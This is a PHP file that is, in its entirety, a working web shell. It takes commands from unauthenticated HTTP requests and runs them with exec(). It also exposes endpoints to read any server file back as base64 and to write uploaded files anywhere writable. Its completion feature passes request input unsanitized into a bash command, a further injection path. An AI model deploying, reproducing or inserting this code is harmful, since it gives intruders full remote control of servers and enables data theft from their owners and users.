<?php

function featureShell($cmd, $cwd) {
    $stdout = array();

    if (preg_match("/^\s*cd\s*$/", $cmd)) {
        // pass
    } elseif (preg_match("/^\s*cd\s+(.+)\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*cd\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        chdir($match[1]);
    } elseif (preg_match("/^\s*download\s+[^\s]+\s*(2>&1)?$/", $cmd)) {
        chdir($cwd);
        preg_match("/^\s*download\s+([^\s]+)\s*(2>&1)?$/", $cmd, $match);
        return featureDownload($match[1]);
    } else {
        chdir($cwd);
        exec($cmd, $stdout);
    }

    return array(
        "stdout" => $stdout,
        "cwd" => getcwd()
    );
}

function featurePwd() {
    return array("cwd" => getcwd());
}

function featureHint($fileName, $cwd, $type) {
    chdir($cwd);
    if ($type == 'cmd') {
        $cmd = "compgen -c $fileName";
    } else {
        $cmd = "compgen -f $fileName";
    }
    $cmd = "/bin/bash -c \"$cmd\"";
    $files = explode("\n", shell_exec($cmd));
    return array(
        'files' => $files,
    );
}

function featureDownload($filePath) {
    $file = @file_get_contents($filePath);
    if ($file === FALSE) {
        return array(
            'stdout' => array('File not found / no read permission.'),
            'cwd' => getcwd()
        );
    } else {
        return array(
            'name' => basename($filePath),
            'file' => base64_encode($file)
        );
    }
}

function featureUpload($path, $file, $cwd) {
    chdir($cwd);
    $f = @fopen($path, 'wb');
    if ($f === FALSE) {
        return array(
            'stdout' => array('Invalid path / no write permission.'),
            'cwd' => getcwd()
        );
    } else {
        fwrite($f, base64_decode($file));
        fclose($f);
        return array(
            'stdout' => array('Done.'),
            'cwd' => getcwd()
        );
    }
}

if (isset($_GET["feature"])) {

    $response = NULL;

    switch ($_GET["feature"]) {
        case "shell":
            $cmd = $_POST['cmd'];
            if (!preg_match('/2>/', $cmd)) {
                $cmd .= ' 2>&1';
            }
            $response = featureShell($cmd, $_POST["cwd"]);
            break;
        case "pwd":
            $response = featurePwd();
            break;
        case "hint":
            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);
            break;
        case 'upload':
            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);
    }

    header("Content-Type: application/json");
    echo json_encode($response);
    die();
}